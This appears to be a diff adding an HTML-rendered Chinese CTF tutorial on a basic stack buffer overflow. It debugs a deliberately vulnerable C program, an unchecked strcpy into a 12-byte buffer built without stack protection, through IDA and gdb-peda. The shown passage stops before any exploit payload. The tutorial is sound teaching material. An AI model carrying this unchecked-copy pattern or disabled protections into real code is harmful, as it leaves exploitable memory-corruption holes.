@@ -1,0 +1,1413 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>1.最单纯的栈溢出</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+<style type="text/css">
+.highlight  { background: #ffffff; }
+.highlight .c { color: #999988; font-style: italic } /* Comment */
+.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
+.highlight .k { font-weight: bold } /* Keyword */
+.highlight .o { font-weight: bold } /* Operator */
+.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
+.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
+.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #aa0000 } /* Generic.Error */
+.highlight .gh { color: #999999 } /* Generic.Heading */
+.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
+.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
+.highlight .go { color: #888888 } /* Generic.Output */
+.highlight .gp { color: #555555 } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
+.highlight .gt { color: #aa0000 } /* Generic.Traceback */
+.highlight .kc { font-weight: bold } /* Keyword.Constant */
+.highlight .kd { font-weight: bold } /* Keyword.Declaration */
+.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
+.highlight .kr { font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
+.highlight .m { color: #009999 } /* Literal.Number */
+.highlight .s { color: #d14 } /* Literal.String */
+.highlight .na { color: #008080 } /* Name.Attribute */
+.highlight .nb { color: #0086B3 } /* Name.Builtin */
+.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
+.highlight .no { color: #008080 } /* Name.Constant */
+.highlight .ni { color: #800080 } /* Name.Entity */
+.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
+.highlight .nn { color: #555555 } /* Name.Namespace */
+.highlight .nt { color: #000080 } /* Name.Tag */
+.highlight .nv { color: #008080 } /* Name.Variable */
+.highlight .ow { font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mf { color: #009999 } /* Literal.Number.Float */
+.highlight .mh { color: #009999 } /* Literal.Number.Hex */
+.highlight .mi { color: #009999 } /* Literal.Number.Integer */
+.highlight .mo { color: #009999 } /* Literal.Number.Oct */
+.highlight .sb { color: #d14 } /* Literal.String.Backtick */
+.highlight .sc { color: #d14 } /* Literal.String.Char */
+.highlight .sd { color: #d14 } /* Literal.String.Doc */
+.highlight .s2 { color: #d14 } /* Literal.String.Double */
+.highlight .se { color: #d14 } /* Literal.String.Escape */
+.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
+.highlight .si { color: #d14 } /* Literal.String.Interpol */
+.highlight .sx { color: #d14 } /* Literal.String.Other */
+.highlight .sr { color: #009926 } /* Literal.String.Regex */
+.highlight .s1 { color: #d14 } /* Literal.String.Single */
+.highlight .ss { color: #990073 } /* Literal.String.Symbol */
+.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
+.highlight .vc { color: #008080 } /* Name.Variable.Class */
+.highlight .vg { color: #008080 } /* Name.Variable.Global */
+.highlight .vi { color: #008080 } /* Name.Variable.Instance */
+.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
+.pl-c {
+    color: #969896;
+}
+
+.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
+    color: #0086b3;
+}
+
+.pl-e,.pl-en {
+    color: #795da3;
+}
+
+.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
+    color: #333;
+}
+
+.pl-ent {
+    color: #63a35c;
+}
+
+.pl-k,.pl-s,.pl-st {
+    color: #a71d5d;
+}
+
+.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
+    color: #df5000;
+}
+
+.pl-id {
+    color: #b52a1d;
+}
+
+.pl-ii {
+    background-color: #b52a1d;
+    color: #f8f8f8;
+}
+
+.pl-sr .pl-cce {
+    color: #63a35c;
+    font-weight: bold;
+}
+
+.pl-ml {
+    color: #693a17;
+}
+
+.pl-mh,.pl-mh .pl-en,.pl-ms {
+    color: #1d3e81;
+    font-weight: bold;
+}
+
+.pl-mq {
+    color: #008080;
+}
+
+.pl-mi {
+    color: #333;
+    font-style: italic;
+}
+
+.pl-mb {
+    color: #333;
+    font-weight: bold;
+}
+
+.pl-md,.pl-mdhf {
+    background-color: #ffecec;
+    color: #bd2c00;
+}
+
+.pl-mdht,.pl-mi1 {
+    background-color: #eaffea;
+    color: #55a532;
+}
+
+.pl-mdr {
+    color: #795da3;
+    font-weight: bold;
+}
+
+.pl-mo {
+    color: #1d3e81;
+}
+.task-list {
+padding-left:10px;
+margin-bottom:0;
+}
+
+.task-list li {
+    margin-left: 20px;
+}
+
+.task-list-item {
+list-style-type:none;
+padding-left:10px;
+}
+
+.task-list-item label {
+font-weight:400;
+}
+
+.task-list-item.enabled label {
+cursor:pointer;
+}
+
+.task-list-item+.task-list-item {
+margin-top:3px;
+}
+
+.task-list-item-checkbox {
+display:inline-block;
+margin-left:-20px;
+margin-right:3px;
+vertical-align:1px;
+}
+</style>
+</head>
+<body>
+<h1 id="-">最单纯的栈溢出</h1>
+<p><strong>Author：wnagzihxain<br>Mail：tudouboom@163.com</strong></p>
+<h2 id="0x00-">0x00 前言</h2>
+<p>CTF的Pwn题好多都是Linux的，非常有意思，以前跟着师傅们学了些，在此简单的写几篇笔记，一来自己对这部分知识有个总结，二来能给刚入门的同学一点参考，不空谈各种奇技淫巧，主要就是完整的调试步骤，当然，奇技淫巧这部分也相当重要，我会在后面给出一些思路不错的好文章，有兴趣的同学可以参考</p>
+<p>使用的环境是</p>
+<ul>
+<li>VM Workstation 12</li><li>Ubuntu 16.04 32位</li><li>gdb + peda</li><li>IDA Pro 6.8(我倒是想买6.9啊)</li></ul>
+<h2 id="0x01-">0x01 基础知识</h2>
+<p>假设大家都有基础C语言的编程经验啊！！！！！！</p>
+<p>写一个简单的拷贝字符串函数，为了汇编出来的流程正常点，使用传参的方法</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void Overflow(char temp[])
+{
+    char buffer[12];
+    strcpy(buffer, temp);
+    printf(&quot;%s\n&quot;, buffer);
+}
+
+int main()
+{
+    char temp[12] = &quot;AAAAAAAAAA&quot;;
+    Overflow(temp);
+    return 0;
+}
+</code></pre><p>使用没有栈保护的模式编译出可执行文件，同时使用<code>-fno-builtin</code>禁止把<code>printf()</code>转为<code>puts()</code></p>
+<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -o Demo Demo.c
+wnagzihxain@toT0C:~$ ./Demo
+AAAAAAAAAA
+</code></pre><p>运行效果是不错的，使用IDA静态分析</p>
+<p><img src="Image/1.png" alt=""></p>
+<p>把<code>main()</code>函数拷贝出来</p>
+<pre><code>.text:0804846A ; =============== S U B R O U T I N E =======================================
+.text:0804846A
+.text:0804846A ; Attributes: bp-based frame
+.text:0804846A
+.text:0804846A ; int __cdecl main(int argc, const char **argv, const char **envp)
+.text:0804846A                 public main
+.text:0804846A main            proc near               ; DATA XREF: _start+17o
+.text:0804846A
+.text:0804846A src             = byte ptr -14h
+.text:0804846A var_10          = dword ptr -10h
+.text:0804846A var_C           = dword ptr -0Ch
+.text:0804846A var_4           = dword ptr -4
+.text:0804846A argc            = dword ptr  0Ch
+.text:0804846A argv            = dword ptr  10h
+.text:0804846A envp            = dword ptr  14h
+.text:0804846A
+.text:0804846A                 lea     ecx, [esp+4]
+.text:0804846E                 and     esp, 0FFFFFFF0h
+.text:08048471                 push    dword ptr [ecx-4]
+.text:08048474                 push    ebp
+.text:08048475                 mov     ebp, esp
+.text:08048477                 push    ecx
+.text:08048478                 sub     esp, 14h        ; 开辟0x14字节的栈空间
+.text:0804847B                 mov     dword ptr [ebp+src], &#39;AAAA&#39; ; 此时ebp+src指向栈顶，连着3句都是在以4字节为单位进行赋值
+.text:08048482                 mov     [ebp+var_10], &#39;AAAA&#39;
+.text:08048489                 mov     [ebp+var_C], &#39;AA&#39;
+.text:08048490                 sub     esp, 0Ch        ; 再次开辟0x0C的栈空间，抬高栈顶
+.text:08048493                 lea     eax, [ebp+src]  ; eax指向src字符串，ebp+src此时为&quot;AAAAAAAAAA&quot;的首地址
+.text:08048496                 push    eax             ; 对src做压栈操作，明显的传参行为
+.text:08048497                 call    Overflow        ; 调用Overflow()函数，参数为src字符串
+.text:0804849C                 add     esp, 10h
+.text:0804849F                 mov     eax, 0          ; return 0;
+.text:080484A4                 mov     ecx, [ebp+var_4]
+.text:080484A7                 leave
+.text:080484A8                 lea     esp, [ecx-4]
+.text:080484AB                 retn
+.text:080484AB main            endp
+</code></pre><p>跟入调用的<code>Overflow()</code>函数</p>
+<pre><code>.text:0804843B
+.text:0804843B ; =============== S U B R O U T I N E =======================================
+.text:0804843B
+.text:0804843B ; Attributes: bp-based frame
+.text:0804843B
+.text:0804843B ; int __cdecl Overflow(char *src)
+.text:0804843B                 public Overflow
+.text:0804843B Overflow        proc near               ; CODE XREF: main+2Dp
+.text:0804843B
+.text:0804843B dest            = byte ptr -14h
+.text:0804843B src             = dword ptr  8
+.text:0804843B
+.text:0804843B                 push    ebp
+.text:0804843C                 mov     ebp, esp
+.text:0804843E                 sub     esp, 18h
+.text:08048441                 sub     esp, 8          ; 抬高栈顶
+.text:08048444                 push    [ebp+src]       ; src是第二个参数
+.text:08048447                 lea     eax, [ebp+dest] ; 获取dest字符串的首地址
+.text:0804844A                 push    eax             ; 将dest作为第一个参数压栈
+.text:0804844B                 call    _strcpy         ; 调用strcpy():---&gt;strcpy(dest, src);
+.text:08048450                 add     esp, 10h        ; 这两句降低栈顶8个字节，相当于弹出两个参数
+.text:08048453                 sub     esp, 8
+.text:08048456                 lea     eax, [ebp+dest] ; 将拷贝完的dest字符串首地址传给eax
+.text:08048459                 push    eax             ; 将dest字符串作为参数压栈
+.text:0804845A                 push    offset format   ; &quot;%s\n&quot;
+.text:0804845F                 call    _printf         ; printf(&quot;%s\n&quot;, dest);
+.text:08048464                 add     esp, 10h
+.text:08048467                 nop
+.text:08048468                 leave
+.text:08048469                 retn
+.text:08048469 Overflow        endp
+</code></pre><p>静态分析到这里，两段汇编逻辑还是很清新的</p>
+<p>接下里我们使用gdb来动态调试，gdb有一个很好用的插件peda</p>
+<p>安装如下</p>
+<pre><code>git clone https://github.com/longld/peda.git ~/peda
+echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
+</code></pre><p>启动调试</p>
+<pre><code>wnagzihxain@toT0C:~$ gdb Demo
+</code></pre><p>出现各种信息，这个不需要管</p>
+<p><img src="Image/2.png" alt=""></p>
+<p>可以直接使用<code>start</code>运行函数，也可以使用<code>break(b)</code>设置<code>main()</code>函数入口断点</p>
+<pre><code>gdb-peda$ break main
+Breakpoint 1 at 0x8048478
+</code></pre><p>使用<code>run(r)</code>运行程序，如果是<code>start</code>就不需要这一步</p>
+<pre><code>gdb-peda$ run
+Starting program: /home/wnagzihxain/Demo
+</code></pre><p>peda骚气的配色一览无遗</p>
+<p><img src="Image/3.png" alt=""></p>
+<p>此时在抬高栈顶，分配<code>0x14</code>字节的空间</p>
+<pre><code>=&gt; 0x8048478 &lt;main+14&gt;:    sub    esp,0x14
+</code></pre><p>继续执行相关的有三个命令</p>
+<ul>
+<li>continue(c)：继续运行到下一个断点</li><li>next(n)：单步步过，和OD里F8一样</li><li>step(s)：单步步入，和OD里F7一样</li></ul>
+<p>此时栈的数据</p>
+<pre><code>[------------------------------------stack-------------------------------------]
+0000| 0xbfffef54 --&gt; 0xbfffef70 --&gt; 0x1 
+0004| 0xbfffef58 --&gt; 0x0 
+0008| 0xbfffef5c --&gt; 0xb7e21637 (&lt;__libc_start_main+247&gt;:    add    esp,0x10)
+0012| 0xbfffef60 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
+0016| 0xbfffef64 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
+0020| 0xbfffef68 --&gt; 0x0 
+0024| 0xbfffef6c --&gt; 0xb7e21637 (&lt;__libc_start_main+247&gt;:    add    esp,0x10)
+0028| 0xbfffef70 --&gt; 0x1
+</code></pre><p>查看栈数据<code>examine(x)</code>，后面跟上要打印的长度和格式</p>
+<pre><code>gdb-peda$ x/12x $sp
+0xbfffef54:    0xbfffef70    0x00000000    0xb7e21637    0xb7fbb000
+0xbfffef64:    0xb7fbb000    0x00000000    0xb7e21637    0x00000001
+0xbfffef74:    0xbffff004    0xbffff00c    0x00000000    0x00000000
+</code></pre><p>使用<code>next</code>命令单步执行</p>
+<p><img src="Image/4.png" alt=""></p>
+<p>栈顶抬高后栈的数据，新开辟出来的栈空间已有的数据不用太在意，并没有什么用</p>
+<pre><code>[------------------------------------stack-------------------------------------]
+0000| 0xbfffef40 --&gt; 0x1 
+0004| 0xbfffef44 --&gt; 0xbffff004 --&gt; 0xbffff1f5 (&quot;/home/wnagzihxain/Demo&quot;)
+0008| 0xbfffef48 --&gt; 0xbffff00c --&gt; 0xbffff20c (&quot;LC_PAPER=zh_HK.UTF-8&quot;)
+0012| 0xbfffef4c --&gt; 0x80484d1 (&lt;__libc_csu_init+33&gt;:    lea    eax,[ebx-0xf8])
+0016| 0xbfffef50 --&gt; 0xb7fbb3dc --&gt; 0xb7fbc1e0 --&gt; 0x0 
+0020| 0xbfffef54 --&gt; 0xbfffef70 --&gt; 0x1 
+0024| 0xbfffef58 --&gt; 0x0 
+0028| 0xbfffef5c --&gt; 0xb7e21637 (&lt;__libc_start_main+247&gt;:    add    esp,0x10)
+</code></pre><p>接下来3句指令将<code>AAAAAAAAAA</code>存储到栈中</p>
+<pre><code>=&gt; 0x804847b &lt;main+17&gt;:    mov    DWORD PTR [ebp-0x14],0x41414141
+   0x8048482 &lt;main+24&gt;:    mov    DWORD PTR [ebp-0x10],0x41414141
+   0x8048489 &lt;main+31&gt;:    mov    DWORD PTR [ebp-0xc],0x4141
+</code></pre><p>如果需要再次执行gdb上一句指令，直接回车就可以，走完拷贝字符串指令</p>
+<p><img src="Image/5.png" alt=""></p>
+<p>再次抬高栈顶</p>
+<pre><code>=&gt; 0x8048490 &lt;main+38&gt;:    sub    esp,0xc
+</code></pre><p>获取<code>AAAAAAAAAA</code>字符串的首地址</p>
+<pre><code>=&gt; 0x8048493 &lt;main+41&gt;:    lea    eax,[ebp-0x14]
+</code></pre><p>执行完后观察EAX寄存器</p>
+<pre><code>EAX: 0xbfffef44 (&quot;AAAAAAAAAA&quot;)
+</code></pre><p>将字符串<code>AAAAAAAAAA</code>压栈，接着调用<code>Overflow()</code>函数</p>
+<pre><code>=&gt; 0x8048496 &lt;main+44&gt;:    push   eax
+   0x8048497 &lt;main+45&gt;:    call   0x804843b &lt;Overflow&gt;
+</code></pre><p>在执行<code>Call</code>指令时，使用<code>step(s)</code>步入<code>Overflow()</code>函数</p>
+<p><img src="Image/6.png" alt=""></p>
+<p>跟入后，停在入口</p>
+<p><img src="Image/7.png" alt=""></p>
+<p>继续使用<code>next(n)</code>命令，抬高栈顶，开辟栈空间给该函数用</p>
+<pre><code>=&gt; 0x804843e &lt;Overflow+3&gt;:    sub    esp,0x18
+   0x8048441 &lt;Overflow+6&gt;:    sub    esp,0x8
+</code></pre><p>到压栈操作，虽然这里看不到<code>ebp+0x8</code>处的数据，但是熟悉栈结构的同学应该想得到这是刚刚传进来的参数存储位置</p>
+<p><img src="Image/8.png" alt=""></p>
+<p>补充一点栈的知识</p>
+<pre><code>0x00000000 EBP
+0x00000004 RETN
+0x00000008 Param1
+0x0000000C Param2
+0x0000000F Param3
+......
+</code></pre><p>执行完后栈的布局，确实是<code>AAAAAAAAAA</code>字符串</p>
+<pre><code>[------------------------------------stack-------------------------------------]
+0000| 0xbfffef04 --&gt; 0xbfffef44 (&quot;AAAAAAAAAA&quot;)
+0004| 0xbfffef08 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
+0008| 0xbfffef0c --&gt; 0xfd57 
+0012| 0xbfffef10 --&gt; 0xffffffff 
+0016| 0xbfffef14 --&gt; 0x2f (&#39;/&#39;)
+0020| 0xbfffef18 --&gt; 0xb7e15dc8 --&gt; 0x2b76 (&#39;v+&#39;)
+0024| 0xbfffef1c --&gt; 0xb7fd6858 --&gt; 0xb7e09000 --&gt; 0x464c457f 
+0028| 0xbfffef20 --&gt; 0x8000
+</code></pre><p>接下来获取<code>ebp-0x14</code>指针，将其压栈，并调用<code>strcpy()</code>函数</p>
+<pre><code>=&gt; 0x8048447 &lt;Overflow+12&gt;:    lea    eax,[ebp-0x14]
+   0x804844a &lt;Overflow+15&gt;:    push   eax
+   0x804844b &lt;Overflow+16&gt;:    call   0x8048310 &lt;strcpy@plt&gt;
+</code></pre><p>执行完后，<code>ebp-0x14</code>指向的数据为<code>AAAAAAAAAA</code></p>
+<p><img src="Image/9.png" alt=""></p>
+<p>拷贝完降低栈顶，这两句等于降低<code>0x08</code>字节</p>
+<pre><code>=&gt; 0x8048450 &lt;Overflow+21&gt;:    add    esp,0x10
+   0x8048453 &lt;Overflow+24&gt;:    sub    esp,0x8
+</code></pre><p>获取两个指针，当参数压栈，调用<code>printf()</code></p>
+<pre><code>=&gt; 0x8048456 &lt;Overflow+27&gt;:    lea    eax,[ebp-0x14]
+   0x8048459 &lt;Overflow+30&gt;:    push   eax
+   0x804845a &lt;Overflow+31&gt;:    push   0x8048530
+   0x804845f &lt;Overflow+36&gt;:    call   0x8048300 &lt;printf@plt&gt;
+</code></pre><p>打印出第一个参数</p>
+<pre><code>gdb-peda$ print (char *)0x8048530
+$1 = 0x8048530 &quot;%s\n&quot;
+</code></pre><p>还有一种打印的方法</p>
+<pre><code>gdb-peda$ x/s 0x8048530
+0x8048530:    &quot;%s\n&quot;
+</code></pre><p>打印</p>
+<p><img src="Image/10.png" alt=""></p>
+<p>接下来就是降低栈顶保持栈平衡，退出函数了</p>
+<h2 id="0x02-">0x02 栈溢出分析</h2>
+<p>回到代码层面，我们传入一个10字节的字符串变量，直接拷贝给了<code>buffer</code>，这里没有考虑传入的字符串长度，如果我们传入的是12字节，16字节，100字节呢？</p>
+<pre><code>void Overflow(char temp[])
+{
+    char buffer[12];
+    strcpy(buffer, temp);
+    printf(&quot;%s\n&quot;, buffer);
+}
+</code></pre><p>重新跑起来，找到拷贝字符串时的栈布局</p>
+<p>拷贝前</p>
+<pre><code>0xbfffef00:    0xbfffef14    0xbfffef44    0xb7fbb000    0x0000fd57
+0xbfffef10:    0xffffffff    0x0000002f    0xb7e15dc8    0xb7fd6858
+0xbfffef20:    0x00008000    0xb7fbb000    0xbfffef58    0x0804849c
+0xbfffef30:    0xbfffef44    0x00000000    0xb7e37a50    0x080484fb
+0xbfffef40:    0x00000001    0x41414141    0x41414141    0x00004141
+0xbfffef50:    0xb7fbb3dc    0xbfffef70    0x00000000    0xb7e21637
+0xbfffef60:    0xb7fbb000    0xb7fbb000    0x00000000    0xb7e21637
+0xbfffef70:    0x00000001    0xbffff004    0xbffff00c    0x00000000
+</code></pre><p>拷贝后，注意小端序的问题</p>
+<pre><code>gdb-peda$ x/32x $sp
+0xbfffef00:    0xbfffef14    0xbfffef44    0xb7fbb000    0x0000fd57
+0xbfffef10:    0xffffffff    0x41414141    0x41414141    0xb7004141
+0xbfffef20:    0x00008000    0xb7fbb000    0xbfffef58    0x0804849c
+0xbfffef30:    0xbfffef44    0x00000000    0xb7e37a50    0x080484fb
+0xbfffef40:    0x00000001    0x41414141    0x41414141    0x00004141
+0xbfffef50:    0xb7fbb3dc    0xbfffef70    0x00000000    0xb7e21637
+0xbfffef60:    0xb7fbb000    0xb7fbb000    0x00000000    0xb7e21637
+0xbfffef70:    0x00000001    0xbffff004    0xbffff00c    0x00000000
+</code></pre><p>为了直观，我们改为26个大写字母来测试，把数量改为11,那么测试字符串就是<code>ABCDEFGHIJK</code></p>
+<p>同样条件编译运行</p>
+<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -o Demo Demo.c
+wnagzihxain@toT0C:~$ ./Demo
+ABCDEFGHIJK
+</code></pre><p>运行，单步到拷贝指令，下个断点</p>
+<pre><code>=&gt; 0x804844b &lt;Overflow+16&gt;:    call   0x8048310 &lt;strcpy@plt&gt;
+</code></pre><p>在对应地址下断点</p>
+<pre><code>gdb-peda$ b *0x804844b
+Breakpoint 2 at 0x804844b
+</code></pre><p>下次直接使用<code>run(r)</code>就可以断在我们设置的断点处而不需要一直单步走到拷贝指令</p>
+<p><img src="Image/11.png" alt=""></p>
+<p>再来看对栈的操作，先抬高<code>0x18</code>字节，也就是24字节，这个空间是用于整个函数层面，后面又抬高<code>0x08</code>字节，接着将两个参数压栈，后面那两句对栈顶的操作效果就是将栈顶指针降低<code>0x08</code>字节，也就是弹出参数</p>
+<pre><code>.text:0804843B                 push    ebp
+.text:0804843C                 mov     ebp, esp
+.text:0804843E                 sub     esp, 18h
+.text:08048441                 sub     esp, 8          ; 抬高栈顶
+.text:08048444                 push    [ebp+src]       ; src是第二个参数
+.text:08048447                 lea     eax, [ebp+dest] ; 获取dest字符串的首地址
+.text:0804844A                 push    eax             ; 将dest作为第一个参数压栈
+.text:0804844B                 call    _strcpy         ; 调用strcpy():---&gt;strcpy(dest, src);
+.text:08048450                 add     esp, 10h        ; 这两句降低栈顶8个字节，相当于弹出两个参数
+.text:08048453                 sub     esp, 8
+</code></pre><p>此时的栈布局</p>
+<pre><code>[------------------------------------stack-------------------------------------]
+0000| 0xbfffef00 --&gt; 0xbfffef14 --&gt; 0x2f (&#39;/&#39;)(第一个参数)
+0004| 0xbfffef04 --&gt; 0xbfffef44 (&quot;ABCDEFGHIJK&quot;)(第二个参数)
+0008| 0xbfffef08 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 (连着8字节是调用strcpy前抬高的0x08字节)
+0012| 0xbfffef0c --&gt; 0xfd57 
+0016| 0xbfffef10 --&gt; 0xffffffff (第一次抬高栈顶时，ESP的位置)
+0020| 0xbfffef14 --&gt; 0x2f (&#39;/&#39;)(ebp-0x14指向这里，也就是dest字符串其实地址)
+0024| 0xbfffef18 --&gt; 0xb7e15dc8 --&gt; 0x2b76 (&#39;v+&#39;)(空)
+0028| 0xbfffef1c --&gt; 0xb7fd6858 --&gt; 0xb7e09000 --&gt; 0x464c457f(空) 
+    | ......
+    | 0xbfffef28 --&gt; 0xbfffef58(此处是EBP，那么ebp-0x14=0xbfffef14)
+</code></pre><p>执行拷贝指令</p>
+<p><img src="Image/12.png" alt=""></p>
+<p>观察此时栈的布局，栈顶的两个参数此时还未弹出，第一个参数指向的是目标地址，可以观察到此时已经拷贝完成</p>
+<pre><code>[------------------------------------stack-------------------------------------]
+0000| 0xbfffef00 --&gt; 0xbfffef14 (&quot;ABCDEFGHIJK&quot;)
+0004| 0xbfffef04 --&gt; 0xbfffef44 (&quot;ABCDEFGHIJK&quot;)
+0008| 0xbfffef08 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
+0012| 0xbfffef0c --&gt; 0xfd57 
+0016| 0xbfffef10 --&gt; 0xffffffff 
+0020| 0xbfffef14 (&quot;ABCDEFGHIJK&quot;)
+0024| 0xbfffef18 (&quot;EFGHIJK&quot;)
+0028| 0xbfffef1c --&gt; 0x4b4a49 (&#39;IJK&#39;)
